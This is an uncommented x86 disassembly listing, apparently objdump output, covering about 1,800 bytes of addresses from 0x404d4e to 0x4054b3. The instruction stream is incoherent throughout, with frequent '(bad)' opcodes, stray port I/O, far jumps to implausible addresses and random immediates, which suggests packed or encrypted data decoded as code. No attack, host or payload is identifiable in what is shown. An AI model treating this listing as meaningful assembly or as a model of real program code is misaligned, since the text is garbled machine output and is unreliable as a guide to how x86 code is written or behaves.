  404d4e:	push   edi
  404d4f:	cmp    DWORD PTR [edx+0x73443501],ebx
  404d55:	add    BYTE PTR [eax],al
  404d57:	jae    0x404d74
  404d59:	inc    edx
  404d5a:	and    ebp,edx
  404d5c:	lock fiadd WORD PTR [ebx]
  404d5f:	in     al,dx
  404d60:	loopne 0x404d54
  404d62:	or     edi,ecx
  404d64:	push   ds
  404d65:	dec    esi
  404d66:	shl    DWORD PTR [esi],cl
  404d68:	ins    DWORD PTR es:[edi],dx
  404d69:	cmp    ah,BYTE PTR [eax]
  404d6b:	(bad)  
  404d6d:	inc    esp
  404d6e:	xor    BYTE PTR [eax],al
  404d70:	add    BYTE PTR [eax+0x60d3f94],bl
  404d76:	push   es
  404d77:	hlt    
  404d78:	pop    ds
  404d79:	push   ebx
  404d7a:	lods   eax,DWORD PTR ds:[esi]
  404d7b:	mov    ds:0xf839ff5f,al
  404d80:	sbb    eax,0x236c99d3
  404d85:	das    
  404d86:	inc    edi
  404d87:	add    al,0x46
  404d89:	add    BYTE PTR [eax],al
  404d8b:	push   eax
  404d8c:	mov    dh,0x5a
  404d8e:	inc    ebp
  404d8f:	and    al,0xfc
  404d91:	pop    edx
  404d92:	pop    ecx
  404d93:	adc    edi,edi
  404d95:	and    DWORD PTR [esi],eax
  404d97:	adc    dl,bl
  404d99:	(bad)  
  404d9a:	push   ds
  404d9b:	pop    ecx
  404d9c:	mov    al,0x76
  404d9e:	sti    
  404d9f:	add    esi,DWORD PTR ds:0x2a4c
  404da5:	imul   BYTE PTR [edi-0x4]
  404da8:	and    esp,DWORD PTR [edi-0x7b2c2ba]
  404dae:	addr16 int3 
  404db0:	aam    0x0
  404db2:	add    BYTE PTR [esi],ah
  404db4:	arpl   WORD PTR gs:[esi-0x5b],sp
  404db8:	jl     0x404d6d
  404dba:	ds pop ds
  404dbc:	jns    0x404e29
  404dbe:	mov    ah,0x29
  404dc0:	rcr    DWORD PTR [eax-0x6f54693],1
  404dc6:	pusha  
  404dc7:	mov    edx,0xbe17bb35
  404dcc:	add    dl,al
  404dce:	add    BYTE PTR [eax],al
  404dd0:	mov    ebx,0xcf16d5d5
  404dd5:	das    
  404dd6:	out    dx,eax
  404dd7:	lds    edx,FWORD PTR [edi]
  404dd9:	mov    ds:0x1241fe71,eax
  404dde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ddf:	inc    ebp
  404de0:	cdq    
  404de1:	test   BYTE PTR [eax-0x5afffff5],0x6a
  404de8:	xchg   esi,eax
  404de9:	jmp    0xc97c13e5
  404dee:	adc    eax,0xbd9ecf96
  404df3:	div    bh
  404df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404df6:	fs push es
  404df8:	jae    0x404df8
  404dfa:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dfc:	aad    0xc
  404dfe:	inc    edx
  404dff:	add    BYTE PTR [eax],al
  404e01:	into   
  404e02:	test   DWORD PTR [edx+0x1d],0x5f00
  404e09:	addr16 in eax,dx
  404e0b:	mov    al,BYTE PTR ds:[ecx]
  404e0e:	loop   0x404da6
  404e10:	add    esp,DWORD PTR [ecx]
  404e12:	imul   edx,DWORD PTR [edi-0x1dee23d],0x9d7e8fdc
  404e1c:	out    dx,eax
  404e1d:	adc    ch,ch
  404e1f:	push   eax
  404e20:	imul   ecx,DWORD PTR [ebx],0xffffffeb
  404e23:	daa    
  404e24:	dec    esi
  404e25:	(bad)  [ecx+0x4a]
  404e28:	mov    dh,0x3e
  404e2a:	loop   0x404dfa
  404e2c:	cmp    ecx,ecx
  404e2e:	jb     0x404e07
  404e30:	cs pop ebp
  404e32:	jge    0x404df0
  404e34:	jne    0x404e39
  404e36:	stos   BYTE PTR es:[edi],al
  404e37:	mov    bh,BYTE PTR ds:[esi]
  404e3a:	retf   0x6803
  404e3d:	(bad)  
  404e3e:	jbe    0x404eb2
  404e40:	cmc    
  404e41:	out    0x42,al
  404e43:	(bad)  
  404e44:	and    eax,0x30c1cd57
  404e49:	addr16 dec edx
  404e4b:	cmp    DWORD PTR [esi+0x32],esi
  404e4e:	mov    cl,0xcd
  404e50:	test   dl,al
  404e52:	add    BYTE PTR [eax],al
  404e54:	pop    ds
  404e55:	data16 sbb al,0x78
  404e58:	xor    al,0xa9
  404e5a:	pusha  
  404e5b:	popa   
  404e5c:	xchg   edi,eax
  404e5d:	das    
  404e5e:	jmp    DWORD PTR [edi-0x27]
  404e61:	mov    ds,WORD PTR ds:0x1a4b8fb3
  404e67:	cmp    eax,0x8c08d7c3
  404e6c:	add    BYTE PTR [eax],al
  404e6e:	dec    edi
  404e6f:	mov    ebx,0x33a11227
  404e74:	test   DWORD PTR [ecx+0x0],ebx
  404e77:	retf   
  404e78:	add    BYTE PTR [eax],al
  404e7a:	sub    DWORD PTR [esi],ebx
  404e7c:	cmp    ch,0x0
  404e7f:	add    ch,bl
  404e81:	hlt    
  404e82:	dec    esp
  404e83:	dec    edx
  404e84:	add    BYTE PTR [eax],al
  404e86:	test   eax,0x29b2d730
  404e8b:	leave  
  404e8c:	inc    edi
  404e8d:	jmp    0x4017:0x8e5c3fad
  404e94:	dec    ecx
  404e95:	add    BYTE PTR [eax],al
  404e97:	sahf   
  404e98:	aaa    
  404e99:	xor    eax,0xf5278b81
  404e9e:	je     0x404e67
  404ea0:	and    ch,dh
  404ea2:	scas   al,BYTE PTR es:[edi]
  404ea3:	in     eax,dx
  404ea4:	add    ch,dl
  404ea6:	cmc    
  404ea7:	stos   DWORD PTR es:[edi],eax
  404ea8:	js     0x404eec
  404eaa:	aaa    
  404eab:	add    BYTE PTR [edi-0x60910000],dl
  404eb1:	xor    DWORD PTR [ebx],ebp
  404eb3:	rcl    DWORD PTR [eax],0xfe
  404eb6:	pusha  
  404eb7:	aas    
  404eb8:	aas    
  404eb9:	out    dx,al
  404eba:	and    al,0x68
  404ebc:	sub    ah,dh
  404ebe:	cmc    
  404ebf:	aas    
  404ec0:	fsub   QWORD PTR [edi+ebx*4+0x7b]
  404ec4:	jbe    0x404e71
  404ec6:	out    0xc2,eax
  404ec8:	(bad)  
  404ec9:	hlt    
  404eca:	aad    0x79
  404ecc:	sbb    al,0x88
  404ece:	inc    ebx
  404ecf:	add    BYTE PTR [eax],al
  404ed1:	mov    cl,0x7c
  404ed3:	(bad)  
  404ed4:	mov    es,WORD PTR [edx+0x65b843d3]
  404eda:	outs   dx,BYTE PTR ds:[esi]
  404edb:	stos   BYTE PTR es:[edi],al
  404edc:	cdq    
  404edd:	push   0xffffffde
  404edf:	mov    ch,0x81
  404ee1:	daa    
  404ee2:	pop    ebx
  404ee3:	stos   DWORD PTR es:[edi],eax
  404ee4:	mov    bl,cl
  404ee6:	mov    eax,ds:0x9de1b34b
  404eeb:	stc    
  404eec:	push   cs
  404eed:	mov    edi,0x181ac3bd
  404ef2:	out    dx,al
  404ef3:	push   ecx
  404ef4:	xchg   edx,eax
  404ef5:	dec    ebx
  404ef6:	mov    al,ds:0x7dcc2a36
  404efb:	add    BYTE PTR [eax],al
  404efd:	jns    0x404efd
  404eff:	or     edi,ebx
  404f01:	xchg   DWORD PTR [ebp-0x6],eax
  404f04:	mul    BYTE PTR [eax]
  404f06:	leave  
  404f07:	lea    edx,[ecx]
  404f09:	mov    esi,0xef45877c
  404f0e:	ins    DWORD PTR es:[edi],dx
  404f0f:	rol    DWORD PTR [esi-0x1b65ca5d],0xfd
  404f16:	adc    BYTE PTR [edx-0x4d100000],0xe7
  404f1d:	cmp    esp,DWORD PTR [edi]
  404f1f:	in     al,0xf9
  404f21:	inc    ebp
  404f22:	mov    cl,0x79
  404f24:	scas   al,BYTE PTR es:[edi]
  404f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f26:	cli    
  404f27:	cmp    BYTE PTR [edi+0x0],0x0
  404f2b:	int3   
  404f2c:	int3   
  404f2d:	add    BYTE PTR [eax],al
  404f2f:	int    0x0
  404f31:	aad    0x0
  404f33:	add    BYTE PTR [ebx+0x37acb54f],cl
  404f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f3a:	ror    DWORD PTR [eax+0x48000085],0xd2
  404f41:	add    BYTE PTR [eax],al
  404f43:	(bad)  
  404f44:	out    0xc,al
  404f46:	aad    0x0
  404f48:	add    BYTE PTR [esi+0x3f],dl
  404f4b:	cmp    DWORD PTR [esp+eiz*2-0x59],edi
  404f4f:	daa    
  404f50:	repz mov WORD PTR [ecx-0x39c60000],?
  404f57:	xchg   DWORD PTR [esi-0x5c76520b],esp
  404f5d:	into   
  404f5e:	(bad)  
  404f5f:	nop
  404f60:	sbb    al,0x57
  404f62:	inc    edx
  404f63:	arpl   WORD PTR [ecx],bx
  404f65:	mov    ebp,0x4500
  404f6a:	std    
  404f6b:	bound  esp,QWORD PTR [eax-0x6a]
  404f6e:	sub    dl,BYTE PTR [ebx+edi*1-0x5da5007d]
  404f75:	inc    ecx
  404f76:	(bad)  
  404f77:	and    eax,ebx
  404f79:	in     al,0xb4
  404f7b:	sbb    eax,0x9cef11a3
  404f80:	mov    ch,0x57
  404f82:	mov    al,0x26
  404f84:	sbb    ebx,DWORD PTR [ebx]
  404f86:	clc    
  404f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f88:	retf   
  404f89:	pop    esp
  404f8a:	icebp  
  404f8b:	int3   
  404f8c:	add    BYTE PTR [eax],al
  404f8e:	add    BYTE PTR [edi],bh
  404f90:	mov    bl,0x22
  404f92:	loope  0x404fa7
  404f94:	push   edx
  404f95:	and    esp,esp
  404f97:	js     0x404ff7
  404f99:	imul   esi,DWORD PTR [esi],0xc9afa3d
  404f9f:	sbb    al,BYTE PTR [eax]
  404fa1:	add    BYTE PTR [ebx-0x76],ah
  404fa4:	gs inc esi
  404fa6:	pop    edi
  404fa7:	xor    ah,0xaf
  404faa:	and    ebx,esi
  404fac:	lea    esi,[ecx+edi*1+0x3a5867a3]
  404fb3:	(bad)  
  404fb4:	out    dx,al
  404fb5:	cld    
  404fb6:	inc    edx
  404fb7:	je     0x404fb2
  404fb9:	add    al,0x1e
  404fbb:	add    BYTE PTR [eax],al
  404fbd:	in     al,dx
  404fbe:	rcl    BYTE PTR [edx+0x3dcd8fb4],cl
  404fc4:	push   edx
  404fc5:	and    bh,dh
  404fc7:	test   edi,edx
  404fc9:	cmp    ch,BYTE PTR [esi+0x7b847b]
  404fcf:	add    BYTE PTR [edi-0x6d],bl
  404fd2:	mov    cl,0x4
  404fd4:	xchg   DWORD PTR [eax],eax
  404fd6:	add    BYTE PTR [edi+ebp*8+0x0],cl
  404fda:	add    BYTE PTR [ebx],bl
  404fdc:	push   esi
  404fdd:	sub    ah,BYTE PTR ds:0x96df5a4b
  404fe3:	fld    QWORD PTR [ecx+0x34]
  404fe6:	sub    ch,BYTE PTR [edx+0x69b89975]
  404fec:	mov    bh,0xf8
  404fee:	in     eax,dx
  404fef:	(bad)  
  404ff0:	(bad)  
  404ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ff2:	out    0x71,eax
  404ff4:	mov    ecx,0x7fa73315
  404ff9:	sub    eax,0x1e344a70
  404ffe:	loop   0x404ffe
  405000:	and    BYTE PTR [esp+edi*2-0x39],bl
  405004:	jl     0x40501c
  405006:	sub    dl,bl
  405008:	(bad)  
  405009:	and    DWORD PTR [ebx-0x6],esp
  40500c:	push   ss
  40500d:	sub    DWORD PTR [eax],esp
  40500f:	cmp    DWORD PTR [eax-0x2b],0xffffffee
  405013:	sub    DWORD PTR [edx+0x12],esi
  405016:	xor    edx,DWORD PTR [esi+0x7c]
  405019:	lea    esp,[ebx]
  40501b:	inc    esp
  40501c:	in     al,0x0
  40501e:	add    dl,dh
  405020:	aaa    
  405021:	pop    edi
  405022:	xor    bh,BYTE PTR [edx-0x46]
  405025:	mov    ch,0xb
  405027:	ret    
  405028:	adc    ebp,DWORD PTR [ecx+ecx*1]
  40502b:	pop    es
  40502c:	jbe    0x405015
  40502e:	mov    ?,esi
  405030:	add    BYTE PTR [edx],dl
  405032:	add    BYTE PTR [eax],al
  405034:	imul   ebp,ebx,0xffffff9c
  405037:	push   ebp
  405038:	and    ecx,DWORD PTR [eax+0x1100001c]
  40503e:	in     eax,dx
  40503f:	pop    ebp
  405040:	sti    
  405041:	jp     0x405014
  405043:	in     eax,dx
  405044:	xor    cl,BYTE PTR [ecx+eiz*4-0x25240000]
  40504b:	data16 jo 0x404fe1
  40504e:	mov    eax,ds:0x7fe57412
  405053:	ja     0x405050
  405055:	lods   al,BYTE PTR ds:[esi]
  405056:	retf   0x4595
  405059:	xor    DWORD PTR [ecx],0x56
  40505c:	sbb    DWORD PTR [edx+0x7c8a7235],ebp
  405062:	mov    ds:0xd4481960,eax
  405067:	add    BYTE PTR [eax],al
  405069:	mov    edx,0x2277f64a
  40506e:	dec    ecx
  40506f:	mov    dh,0x84
  405071:	add    BYTE PTR cs:[eax],al
  405074:	pop    esi
  405075:	fwait
  405076:	jle    0x405034
  405078:	in     al,dx
  405079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40507a:	pop    eax
  40507b:	mov    ebx,ecx
  40507d:	pushf  
  40507e:	cld    
  40507f:	sub    al,0xb4
  405081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405082:	shl    DWORD PTR [esi],0x7e
  405085:	rcr    BYTE PTR [ebx-0x64895781],1
  40508b:	aas    
  40508c:	pop    edx
  40508d:	jl     0x4050a7
  40508f:	sbb    eax,0x32f8f1b6
  405094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405095:	pop    edx
  405096:	outs   dx,BYTE PTR ds:[esi]
  405097:	jle    0x405027
  405099:	popf   
  40509a:	xor    al,0xb9
  40509c:	cmp    al,0x57
  40509e:	xor    BYTE PTR [ebp-0x292600dd],cl
  4050a4:	cmp    dh,al
  4050a6:	hlt    
  4050a7:	loope  0x4050ea
  4050a9:	sbb    DWORD PTR [esi+0x72],esi
  4050ac:	and    BYTE PTR cs:[ebp+0x2f5ddbeb],cl
  4050b3:	jnp    0x405061
  4050b5:	(bad)
  4050b8:	sbb    eax,0xcafc0000
  4050bd:	xchg   edi,eax
  4050bf:	jge    0x4050bb
  4050c1:	scas   eax,DWORD PTR es:[edi]
  4050c2:	pop    edx
  4050c3:	push   0x3be2ba8d
  4050c8:	retf   
  4050c9:	(bad)  
  4050ca:	in     eax,0xb3
  4050cc:	stc    
  4050cd:	fisttp QWORD PTR [esi+ecx*1+0x17360000]
  4050d4:	sub    eax,ecx
  4050d6:	cmp    ch,ah
  4050d8:	in     eax,dx
  4050d9:	test   BYTE PTR [edi+0x0],cl
  4050dc:	add    bl,bl
  4050de:	cmp    DWORD PTR [ecx+0x46],edi
  4050e1:	and    ch,BYTE PTR [ecx+0x26]
  4050e4:	cwde   
  4050e5:	je     0x40510a
  4050e7:	jns    0x4050fe
  4050e9:	outs   dx,DWORD PTR ds:[esi]
  4050ea:	shr    DWORD PTR ds:0x77d47676,cl
  4050f0:	jle    0x40509b
  4050f2:	sub    ah,bh
  4050f4:	int    0xcb
  4050f6:	mov    fs,WORD PTR [bp+si-0x1cc]
  4050fb:	int    0x63
  4050fd:	push   edx
  4050fe:	dec    eax
  4050ff:	ins    BYTE PTR es:[edi],dx
  405100:	add    BYTE PTR [eax],al
  405102:	repz in al,0x61
  405105:	xchg   edi,eax
  405106:	pushf  
  405107:	shl    BYTE PTR [esi],0x0
  40510a:	add    BYTE PTR ds:0x824c57,ah
  405110:	add    BYTE PTR [edx],ch
  405112:	pop    eax
  405113:	cmp    bp,WORD PTR [esi]
  405116:	sti    
  405117:	daa    
  405118:	mov    edi,DWORD PTR [ecx-0x198986f7]
  40511e:	in     al,dx
  40511f:	pop    es
  405120:	scas   al,BYTE PTR es:[edi]
  405121:	or     DWORD PTR [eax+ebp*1-0x21c87690],edi
  405128:	sub    eax,0x1ac0
  40512d:	pop    ebx
  40512e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40512f:	sti    
  405130:	int3   
  405131:	pusha  
  405132:	add    BYTE PTR [eax],al
  405134:	jae    0x4050e8
  405136:	sbb    BYTE PTR [ebx],dl
  405138:	ss dec esi
  40513a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40513c:	out    dx,al
  40513d:	sbb    al,BYTE PTR [esi]
  40513f:	jg     0x4051bf
  405141:	(bad)  
  405142:	jp     0x40515f
  405144:	rcl    BYTE PTR [edx+0x0],0x0
  405148:	add    edx,DWORD PTR [ebp+0x6e526231]
  40514e:	xchg   esi,eax
  40514f:	push   ebp
  405150:	imul   edi,DWORD PTR fs:[ebx],0x5a6ccb3f
  405157:	add    al,0xd5
  405159:	add    BYTE PTR [eax],al
  40515b:	loopne 0x4051c8
  40515d:	imul   edx,DWORD PTR [ebp+0x1a],0xbf5960b
  405164:	pop    ebx
  405165:	lea    esp,[ebx]
  405167:	ss js  0x4050ef
  40516a:	arpl   sp,bx
  40516c:	fcom   DWORD PTR [esi+0x5a]
  40516f:	(bad)  
  405170:	jns    0x405134
  405172:	xor    dh,BYTE PTR [ecx+0x48]
  405175:	pusha  
  405176:	add    BYTE PTR [eax],al
  405178:	inc    eax
  405179:	dec    ebx
  40517a:	add    BYTE PTR [eax],al
  40517c:	mov    eax,ds:0x3a656aeb
  405181:	imul   edi,DWORD PTR [edi],0x323438fc
  405187:	aad    0x8c
  405189:	les    eax,FWORD PTR [eax]
  40518b:	add    BYTE PTR [ebx],al
  40518d:	pusha  
  40518e:	jle    0x4051b2
  405190:	mov    ds:0xfccab4f8,eax
  405195:	jb     0x4051d4
  405197:	rol    BYTE PTR [eax-0x74ffff3f],1
  40519d:	std    
  40519e:	aad    0x3e
  4051a0:	daa    
  4051a1:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4051a3:	push   ds
  4051a4:	sub    cl,ah
  4051a6:	repz sub ah,BYTE PTR [edi]
  4051a9:	dec    ecx
  4051aa:	shr    BYTE PTR [ebp+0x7c85d83],cl
  4051b0:	add    BYTE PTR [eax],al
  4051b2:	es push es
  4051b4:	jb     0x4051d6
  4051b6:	mov    esi,0x1cc07d
  4051bb:	add    BYTE PTR [edi],ah
  4051bd:	adc    DWORD PTR [esi+0x7dd5d7f9],ebp
  4051c3:	jecxz  0x405202
  4051c5:	mov    ecx,0x3bea3e60
  4051ca:	cmp    eax,0xb60e30c6
  4051cf:	lock rol BYTE PTR [edx-0x4c],1
  4051d3:	sbb    BYTE PTR [edx+0x9],ch
  4051d6:	stc    
  4051d7:	lds    edi,FWORD PTR [eax+0x709276fe]
  4051dd:	jae    0x405191
  4051df:	add    BYTE PTR [esi+0x9680000],dh
  4051e5:	mov    bl,0xef
  4051e7:	int    0x4
  4051e9:	mov    BYTE PTR [eax],al
  4051eb:	add    BYTE PTR [ecx+0xc50bb09],cl
  4051f1:	cmp    BYTE PTR [eax],al
  4051f3:	add    BYTE PTR [ebx+0x23],cl
  4051f6:	push   ebx
  4051f7:	mov    DWORD PTR [edi-0x2f],esp
  4051fa:	jmp    0x4051ad
  4051fc:	fisubr WORD PTR [eax]
  4051fe:	stc    
  4051ff:	imul   esp,DWORD PTR [eax+0x74c1d0a0],0xf06bfa5a
  405209:	aaa    
  40520a:	pop    edi
  40520b:	mov    esi,0xe68f6a1
  405210:	loope  0x4051dc
  405212:	cmp    al,0x7
  405214:	adc    BYTE PTR [edi-0x71],0x87
  405218:	xchg   ebp,eax
  405219:	push   es
  40521a:	dec    ecx
  40521b:	mov    ds:0xd8eaa0b,al
  405220:	out    dx,al
  405221:	push   edi
  405222:	push   ebx
  405223:	out    0xf4,eax
  405225:	adc    eax,DWORD PTR [eax-0x56]
  405228:	add    BYTE PTR [eax],al
  40522a:	sti    
  40522b:	out    0x3e,al
  40522d:	cmp    BYTE PTR [edi-0x72af716a],ah
  405233:	neg    bh
  405235:	or     al,dl
  405237:	add    BYTE PTR [eax],al
  405239:	sbb    DWORD PTR [edi],0xdd987029
  40523f:	test   eax,0xb0707c60
  405244:	mov    ch,0xf9
  405246:	dec    ebp
  405247:	mov    eax,ds:0x24f7893d
  40524c:	out    dx,eax
  40524d:	in     eax,dx
  40524e:	cli    
  40524f:	inc    edx
  405250:	gs push es
  405252:	add    bh,BYTE PTR [edi-0x42aa3dac]
  405258:	jbe    0x40523b
  40525a:	sahf   
  40525b:	bound  ebx,QWORD PTR [eax]
  40525d:	adc    DWORD PTR [edx],0xc81a2e96
  405263:	mov    BYTE PTR [eax],0x0
  405266:	mov    ch,0xf9
  405268:	nop
  405269:	or     ah,BYTE PTR [esi-0x6367c5e8]
  40526f:	lea    esp,[ecx]
  405271:	jecxz  0x40523e
  405273:	xor    DWORD PTR [ebx],ebp
  405275:	xlat   BYTE PTR ds:[ebx]
  405276:	(bad)  
  405277:	xchg   esi,eax
  405278:	je     0x405249
  40527a:	in     eax,dx
  40527b:	lds    ebx,FWORD PTR [ebx]
  40527d:	or     DWORD PTR ds:0xedba7bbb,edi
  405283:	and    ebp,DWORD PTR [ecx+0x19]
  405286:	lods   al,BYTE PTR ds:[esi]
  405287:	shr    DWORD PTR [esi],1
  405289:	mov    eax,0x8ea736cf
  40528e:	xor    BYTE PTR [eax+0xf],ch
  405291:	outs   dx,DWORD PTR ds:[esi]
  405292:	shr    BYTE PTR [ecx],0x0
  405295:	add    BYTE PTR [edi+edi*8-0x332f5979],ah
  40529c:	das    
  40529d:	add    BYTE PTR [eax],al
  40529f:	sub    BYTE PTR [eax],ah
  4052a1:	mov    bl,0x7f
  4052a3:	retf   
  4052a4:	je     0x405247
  4052a6:	fwait
  4052a7:	stos   DWORD PTR es:[edi],eax
  4052a8:	inc    eax
  4052a9:	sub    al,0x0
  4052ab:	add    ch,bh
  4052ad:	or     DWORD PTR [ebp-0x69cd74bb],edx
  4052b3:	test   al,0xa
  4052b5:	dec    eax
  4052b6:	xchg   ebx,eax
  4052b7:	add    BYTE PTR [eax],al
  4052b9:	dec    ebx
  4052ba:	test   al,0xb0
  4052bc:	jge    0x40526a
  4052be:	imul   eax,DWORD PTR [ebx-0x75cbcd59],0xffffffff
  4052c5:	mov    WORD PTR [eax+eax*1],gs
  4052c8:	add    bl,ah
  4052ca:	pusha  
  4052cb:	add    eax,0x1ecfd74b
  4052d0:	inc    esp
  4052d1:	pop    es
  4052d2:	add    BYTE PTR [eax],al
  4052d4:	mov    ds:0x53dc34d1,al
  4052d9:	mov    esp,DWORD PTR ds:0xf009d21d
  4052df:	fdivr  QWORD PTR [esi-0xc74d45d]
  4052e5:	xor    bl,BYTE PTR [edi-0x723a8304]
  4052eb:	mov    ds:0x8bf1f06d,al
  4052f0:	(bad)  
  4052f1:	adc    cl,BYTE PTR [ebx]
  4052f3:	mov    ds:0x1ac2a523,eax
  4052f8:	out    0xc6,eax
  4052fa:	sbb    ebx,eax
  4052fc:	out    0xc1,eax
  4052fe:	mov    esi,0x11fa106a
  405303:	sub    eax,0x7a84fdb9
  405308:	add    BYTE PTR [eax],al
  40530a:	imul   ebx,DWORD PTR [ebp+0x49]
  40530e:	mov    bl,0x86
  405310:	cmp    ebx,DWORD PTR [edi-0x45614e68]
  405316:	sbb    ah,BYTE PTR [ecx+eax*2]
  405319:	mov    dl,0x36
  40531b:	es inc eax
  40531d:	fadd   QWORD PTR [eax]
  40531f:	add    bl,al
  405321:	loopne 0x4052b1
  405323:	cmp    DWORD PTR [eax-0x4],eax
  405326:	add    BYTE PTR [eax],al
  405328:	orps   xmm3,xmm6
  40532b:	out    dx,al
  40532c:	hlt    
  40532d:	call   0x2cce9144
  405332:	cmp    DWORD PTR [edi],eax
  405334:	aam    0x30
  405336:	jle    0x40534e
  405338:	pop    es
  405339:	test   eax,0xdf7f6d90
  40533e:	imul   esp,DWORD PTR ds:0xe59e2ccb,0x1d56320d
  405348:	or     BYTE PTR [eax+0x7e3f0000],ch
  40534e:	xchg   edi,eax
  40534f:	jg     0x4052ea
  405351:	mov    ecx,0x21b434b1
  405356:	push   eax
  405357:	push   esp
  405358:	and    esp,DWORD PTR [edx+0x13]
  40535b:	call   0x5dd678fb
  405360:	loope  0x405357
  405362:	lds    ecx,FWORD PTR [ebp+0x65]
  405365:	out    0xfe,al
  405367:	jno    0x405374
  405369:	pop    ebx
  40536a:	dec    ebp
  40536b:	jbe    0x405326
  40536d:	pop    es
  40536e:	fcom   st(0)
  405370:	and    esi,DWORD PTR [edi+edi*8]
  405373:	xchg   edi,eax
  405374:	mov    ebp,0x3a02b86b
  405379:	xor    BYTE PTR [edi],dh
  40537b:	in     eax,0xbf
  40537d:	pop    es
  40537e:	imul   eax,ebx,0x39
  405381:	mov    esi,0xcd3cf937
  405386:	into   
  405387:	or     al,0x6f
  405389:	add    BYTE PTR [eax],al
  40538b:	mov    ds:0x3a6aaa73,eax
  405390:	mov    dl,BYTE PTR [edi]
  405392:	loop   0x405351
  405394:	gs icebp 
  405396:	mov    bl,0xd9
  405398:	outs   dx,DWORD PTR ds:[esi]
  405399:	mov    ch,0x97
  40539b:	dec    ebp
  40539c:	sub    eax,0xa6bd5f3c
  4053a1:	es addr16 rcr edi,cl
  4053a5:	sub    BYTE PTR [ebp+eax*8-0x76611171],bh
  4053ac:	fild   DWORD PTR [edx]
  4053ae:	cmp    eax,edi
  4053b0:	mov    al,ds:0xe33dea8
  4053b5:	sbb    al,BYTE PTR [ebx]
  4053b7:	lods   eax,DWORD PTR ds:[esi]
  4053b8:	jecxz  0x405347
  4053ba:	mov    al,0xaa
  4053bc:	ss mov edi,0x321030a9
  4053c2:	inc    esp
  4053c3:	add    eax,DWORD PTR [eax]
  4053c5:	add    BYTE PTR [edi],dl
  4053c7:	stc    
  4053c8:	shr    DWORD PTR [eax+0x20e1f2c5],cl
  4053ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053cf:	dec    edi
  4053d0:	mov    cl,0x84
  4053d2:	inc    esi
  4053d3:	add    BYTE PTR [eax],al
  4053d5:	jge    0x405382
  4053d7:	sub    dl,dh
  4053d9:	addr16 xchg esp,eax
  4053db:	mov    bl,0x1
  4053dd:	fbstp  TBYTE PTR cs:[esi+0x7c]
  4053e1:	(bad)  
  4053e3:	mov    bl,0x24
  4053e5:	xchg   ecx,eax
  4053e6:	xchg   edx,eax
  4053e7:	shl    ah,0x0
  4053ea:	add    BYTE PTR [edi+edi*4-0x33a05f10],ch
  4053f1:	jb     0x4053f3
  4053f3:	add    BYTE PTR [ebx-0x41],ch
  4053f6:	sbb    DWORD PTR [eax],esi
  4053f8:	inc    ecx
  4053f9:	cld    
  4053fa:	pushf  
  4053fb:	jl     0x4053f7
  4053fd:	pop    esp
  4053fe:	dec    edx
  4053ff:	sbb    eax,DWORD PTR [esp+esi*4+0x0]
  405403:	add    BYTE PTR [edx],bh
  405405:	xchg   edx,eax
  405406:	aas    
  405407:	push   eax
  405408:	xor    BYTE PTR [edx],bh
  40540a:	int3   
  40540b:	jbe    0x40540d
  40540d:	add    BYTE PTR [esi-0x4e],ah
  405410:	mov    ebx,0x5e041c7e
  405415:	add    BYTE PTR [eax],al
  405417:	pop    esi
  405418:	mov    ah,0x8c
  40541a:	mov    DWORD PTR [eax],eax
  40541c:	add    BYTE PTR [edi-0x70a1baf],cl
  405422:	or     BYTE PTR [ecx],cl
  405424:	add    BYTE PTR [eax],al
  405426:	cmp    al,0x87
  405428:	push   ds
  405429:	inc    edx
  40542a:	ret    
  40542b:	stos   DWORD PTR es:[edi],eax
  40542c:	dec    ecx
  40542d:	ins    DWORD PTR es:[edi],dx
  40542e:	cmp    eax,0xee89bfbe
  405433:	ret    
  405434:	xor    DWORD PTR ds:0x7aa2e735,edi
  40543a:	inc    ebx
  40543b:	je     0x405495
  40543d:	out    dx,al
  40543e:	jge    0x40542d
  405440:	cld    
  405441:	add    edi,edi
  405443:	(bad)  
  405444:	mov    dh,0xd4
  405446:	mov    esp,0xee6e83f3
  40544b:	xlat   BYTE PTR ds:[ebx]
  40544c:	mov    ebx,es
  40544e:	add    BYTE PTR [eax],al
  405450:	xor    al,0xa3
  405452:	cmp    al,0x17
  405454:	adc    al,0xac
  405456:	jne    0x4053f1
  405458:	mov    esi,eax
  40545a:	int    0x4f
  40545c:	xor    DWORD PTR [eax-0x5e4e8ae7],esp
  405462:	aam    0x11
  405464:	aaa    
  405465:	mov    bh,0xf4
  405467:	loope  0x405461
  405469:	inc    edi
  40546a:	mov    bl,0x86
  40546c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40546d:	jne    0x4053fd
  40546f:	pop    ebx
  405470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405471:	and    BYTE PTR [eax+0x4a],cl
  405474:	add    BYTE PTR [eax],al
  405476:	pop    ss
  405477:	loop   0x40549b
  405479:	jmp    0x8048dae0
  40547e:	add    BYTE PTR [eax],al
  405480:	xor    DWORD PTR [ebx],eax
  405482:	lods   al,BYTE PTR ds:[esi]
  405483:	add    cl,ah
  405485:	add    BYTE PTR [eax],al
  405487:	mov    edi,0x2e056885
  40548c:	push   cs
  40548d:	adc    al,0xa4
  40548f:	ret    0xa4c5
  405492:	adc    eax,0xd8d976f8
  405497:	(bad)  
  405498:	adc    eax,0xe86619d1
  40549d:	not    BYTE PTR es:[ebp+0x27]
  4054a1:	jne    0x40547d
  4054a3:	pop    ss
  4054a4:	clc    
  4054a5:	mov    dh,0x26
  4054a7:	(bad)  
  4054a8:	in     al,0xb3
  4054aa:	mov    ah,0x28
  4054ac:	out    dx,al
  4054ad:	jne    0x4054ee
  4054af:	stc    
  4054b0:	int3   
  4054b1:	jge    0x4054b3
  4054b3:	add    BYTE PTR [eax+0x68],al
